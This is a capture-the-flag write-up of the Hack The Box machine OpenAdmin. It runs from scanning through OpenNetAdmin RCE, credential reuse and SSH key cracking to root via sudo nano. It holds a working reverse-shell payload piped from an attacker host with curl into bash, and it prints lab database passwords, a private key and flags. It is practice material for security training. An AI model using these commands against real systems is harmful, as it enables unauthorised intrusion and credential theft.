# Scan

```bash
ghost@localhost [16:45:11] [~/Documents/hacking/tj-null-boxes/openadmin] [master]
-> % rustscan -a $IP -- -sC -sV

Open 10.10.10.171:22
Open 10.10.10.171:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b98df85d17ef03dda48cdbc9200b754 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcVHOWV8MC41kgTdwiBIBmUrM8vGHUM2Q7+a0LCl9jfH3bIpmuWnzwev97wpc8pRHPuKfKm0c3iHGII+cKSsVgzVtJfQdQ0j/GyDcBQ9s1VGHiYIjbpX30eM2P2N5g2hy9ZWsF36WMoo5Fr+mPNycf6Mf0QOODMVqbmE3VVZE1VlX3pNW4ZkMIpDSUR89JhH+PHz/miZ1OhBdSoNWYJIuWyn8DWLCGBQ7THxxYOfN1bwhfYRCRTv46tiayuF2NNKWaDqDq/DXZxSYjwpSVelFV+vybL6nU0f28PzpQsmvPab4PtMUb0epaj4ZFcB1VVITVCdBsiu4SpZDdElxkuQJz
|   256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
|   256 dcadca3c11315b6fe6a489347c9be550 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcV0sVI0yWfjKsl7++B9FGfOVeWAIWZ4YGEMROPxxk4
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# 80

By running Feroxbuster, found some URLs.

```bash
ghost@localhost [16:50:21] [~/Documents/hacking/tj-null-boxes/openadmin] [master *]
-> % feroxbuster -u http://$IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k

200      GET      375l      964w    10918c http://10.10.10.171/
301      GET        9l       28w      312c http://10.10.10.171/music => http://10.10.10.171/music/
301      GET        9l       28w      316c http://10.10.10.171/music/img => http://10.10.10.171/music/img/
301      GET        9l       28w      316c http://10.10.10.171/music/css => http://10.10.10.171/music/css/
301      GET        9l       28w      315c http://10.10.10.171/music/js => http://10.10.10.171/music/js/
301      GET        9l       28w      314c http://10.10.10.171/artwork => http://10.10.10.171/artwork/
301      GET        9l       28w      321c http://10.10.10.171/artwork/images => http://10.10.10.171/artwork/images/
301      GET        9l       28w      318c http://10.10.10.171/artwork/css => http://10.10.10.171/artwork/css/
301      GET        9l       28w      317c http://10.10.10.171/artwork/js => http://10.10.10.171/artwork/js/
301      GET        9l       28w      320c http://10.10.10.171/artwork/fonts => http://10.10.10.171/artwork/fonts/
301      GET        9l       28w      319c http://10.10.10.171/music/Source => http://10.10.10.171/music/Source/
301      GET        9l       28w      313c http://10.10.10.171/sierra => http://10.10.10.171/sierra/
301      GET        9l       28w      317c http://10.10.10.171/sierra/css => http://10.10.10.171/sierra/css/
301      GET        9l       28w      316c http://10.10.10.171/sierra/js => http://10.10.10.171/sierra/js/
301      GET        9l       28w      319c http://10.10.10.171/sierra/fonts => http://10.10.10.171/sierra/fonts/
301      GET        9l       28w      321c http://10.10.10.171/sierra/vendors => http://10.10.10.171/sierra/vendors/
```

Found 3 websites
- http://10.10.10.171/music/
- http://10.10.10.171/artwork/
- http://10.10.10.171/sierra/

From music, also found another login page
- http://10.10.10.171/ona/

It is running ONA v18.1.1 which is vulnerable to RCE.

```bash
ghost@localhost [18:42:01] [~/Documents/hacking/tj-null-boxes/openadmin] [master *]
-> % searchsploit OpenNetAdmin
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                           | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)            | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                             | php/webapps/47691.sh
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```

You can read about the explanation here (https://medium.com/r3d-buck3t/remote-code-execution-in-opennetadmin-5d5a53b1e67).

For the exploit 47691, the blog post can be found here (https://zacheller.dev/open-net-admin). Also I found additional web pages under `/var/www/html`.

```bash
ghost@localhost [18:54:05] [~/Documents/hacking/tj-null-boxes/openadmin] [master *]
-> % ./47691.sh 10.10.10.171/ona/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ ls /var/www/html
artwork
index.html
marga
music
ona
sierra
```

I gain the reverse shell by hosting reverse shell code in local, serve via HTTP server. Then curl from the target machine and pipe to bash.

```bash
ghost@localhost [23:41:40] [~/Documents/hacking/tj-null-boxes/openadmin] [master *]
-> % echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 4444 >/tmp/f" > shell


ghost@localhost [23:40:31] [~/Documents/hacking/tj-null-boxes/openadmin] [master *]
-> % ./47691.sh 10.10.10.171/ona/
$ curl 10.10.14.8/shell | bash


ghost@localhost [23:40:44] [~/Documents/hacking/tj-null-boxes/openadmin] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.171] 35020
/bin/sh: 0: can't access tty; job control turned off
$
```


# User

I found 2 users
- jummy
- joanna

```bash
www-data@openadmin:/opt/ona/www$ ls /home
ls /home
jimmy  joanna
```

I first check SUID.

```bash
www-data@openadmin:/opt/ona/www$ find / -perm /4000 2>/dev/null | grep -v 'snap'
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/at
/bin/ping
/bin/umount
/bin/su
/bin/mount
/bin/fusermount
```

From OpenNetAdmin GitHub repository, according to the config file (https://github.com/opennetadmin/ona/blob/master/www/config/config.inc.php), it loads the databse config from `local/config`.

```php
// Include the localized Database settings
$dbconffile = "{$base}/local/config/database_settings.inc.php";
```

So I looked for that file under `/opt/ona/www/local/config` and found it.

```php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```

So I connect to the MySQL and download user credentials.

```bash
www-data@openadmin:/opt/ona/www/local/config$ mysql -u ona_sys -pn1nj4W4rri0R! ona_default
...
mysql> SHOW tables;
+------------------------+
| Tables_in_ona_default  |
+------------------------+
| ...                    |
| users                  |
| ...                    |
+------------------------+
40 rows in set (0.00 sec)

mysql> SHOW COLUMNS FROM users;
+----------+------------------+------+-----+-------------------+-----------------------------+
| Field    | Type             | Null | Key | Default           | Extra                       |
+----------+------------------+------+-----+-------------------+-----------------------------+
| id       | int(10) unsigned | NO   | PRI | NULL              | auto_increment              |
| username | varchar(32)      | NO   | UNI | NULL              |                             |
| password | varchar(64)      | NO   |     | NULL              |                             |
| level    | int(4)           | NO   |     | 0                 |                             |
| ctime    | timestamp        | NO   |     | CURRENT_TIMESTAMP | on update CURRENT_TIMESTAMP |
| atime    | datetime         | YES  |     | NULL              |                             |
+----------+------------------+------+-----+-------------------+-----------------------------+
6 rows in set (0.00 sec)

mysql> SELECT username, password, level FROM users;
+----------+----------------------------------+-------+
| username | password                         | level |
+----------+----------------------------------+-------+
| guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 |
| admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 |
+----------+----------------------------------+-------+
2 rows in set (0.00 sec)
```

```bash
ghost@localhost [00:07:13] [~/Documents/hacking/tj-null-boxes/openadmin] [master *]
-> % hashcat hashes /usr/share/wordlists/rockyou.txt -O -S -w 3 -m 0
098f6bcd4621d373cade4e832627b4f6:test
21232f297a57a5a743894a0e4a801fc3:admin
```

Seems like default passwords. So anyway, using the password `n1nj4W4rri0R!` I decided to try on 2 users.
- jimmy
- joanna

It works with the user jimmy.

```bash
www-data@openadmin:/opt/ona/www/local/config$ su jimmy
Password: n1nj4W4rri0R!
jimmy@openadmin:/opt/ona/www/local/config$ exit


www-data@openadmin:/opt/ona/www/local/config$ su joanna
Password: n1nj4W4rri0R!
su: Authentication failure
```

But the user `jimmy` has no `user.txt` so I need to move to `joanna` somehow.

```bash
jimmy@openadmin:~$ cat user.txt
cat: user.txt: No such file or directory
```

I checked what files seems to be writable and found an interesting directory `/var/www/internal`.

```bash
jimmy@openadmin:~$ find / -writable 2>/dev/null | grep -v 'proc\|snap\|sys\|dev\|run\|tmp'
/var/crash
/var/lib/php/sessions
/var/lib/lxcfs/cgroup
/var/www/internal
/var/www/internal/main.php
/var/www/internal/logout.php
/var/www/internal/index.php
/var/lock
/home/jimmy
/home/jimmy/.local
/home/jimmy/.local/share
/home/jimmy/.local/share/nano
/home/jimmy/.local/share/nano/search_history
/home/jimmy/.bashrc
/home/jimmy/.cache
/home/jimmy/.cache/motd.legal-displayed
/home/jimmy/.profile
/home/jimmy/.gnupg
/home/jimmy/.gnupg/private-keys-v1.d
/home/jimmy/.bash_history
/home/jimmy/.bash_logout
```

From nmap scan, I know that Apache is running for web pages. So I checked `site-enabled` under the Apache.

```bash
jimmy@openadmin:/var/www/internal$ ls /etc/apache2/sites-enabled
internal.conf  openadmin.conf

jimmy@openadmin:/var/www/internal$ cat /etc/apache2/sites-enabled/internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

It shows that the site is running under the user `joanna` at port 52846. You can read the documentation here (http://mpm-itk.sesse.net/).

I will copy basically what is `AssignUserID`.

```markdown
`AssignUserID`: Takes two parameters, uid and gid (or really, user name and group name; use “#<uid>” if you want to specify a raw uid); specifies what uid and gid the vhost will run as (after parsing the request etc., of course). Note that if you do not assign a user ID, the default one from Apache will be used.
```

When I read `index.php` found a hardcoded hash.

```bash
jimmy@openadmin:/var/www/internal$ cat index.php
...
if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
...
```

From the code, I know it is SHA512. I tried `hashcat` but does not work ???

So I use `john` instead.

```bash
ghost@localhost [00:26:39] [~/Documents/hacking/tj-null-boxes/openadmin] [master *]
-> % john hash.joanna --format=Raw-SHA512 -w=/usr/share/wordlists/rockyou.txt --rules=jumbo
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=6
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

Revealed         (?)

1g 0:00:00:01 DONE (2022-11-14 00:27) 0.7575g/s 11710Kp/s 11710Kc/s 11710KC/s Ricanchula..Reesenme
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

My reverse SSH tunneling seems to be an issue with HackTheBox machine. So I just curl directly.

```bash
jimmy@openadmin:/var/www/internal$ curl localhost:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Convert to hash and crack it with `john`.

```bash
ghost@localhost [01:10:13] [~/Documents/hacking/tj-null-boxes/openadmin] [master *]
-> % ssh2john rsa.joanna > hash.ssh.joanna

ghost@localhost [01:10:29] [~/Documents/hacking/tj-null-boxes/openadmin] [master *]
-> % john hash.ssh.joanna -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

bloodninjas      (rsa.joanna)

1g 0:00:00:01 DONE (2022-11-14 01:10) 0.6369g/s 6098Kp/s 6098Kc/s 6098KC/s bloodninjas..bloodmabite
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Then I manage to login as `joanna`.

```bash
ghost@localhost [01:12:47] [~/Documents/hacking/tj-null-boxes/openadmin] [master *]
-> % ssh joanna@10.10.10.171 -i rsa.joanna
Enter passphrase for key 'rsa.joanna':

joanna@openadmin:~$ cat user.txt
c204e61b3a09bfe3b0675dbbdde6b744
```


# Privilege escalation

I checked `SUID` and got `nano`.

```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

You can look to `GTFO` bin for privilege escalation with nano.

https://gtfobins.github.io/gtfobins/nano/

```bash
joanna@openadmin:~$ sudo /bin/nano /opt/priv

...

# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
3f82551c3deb6f23a7be41bab1d673a3
```
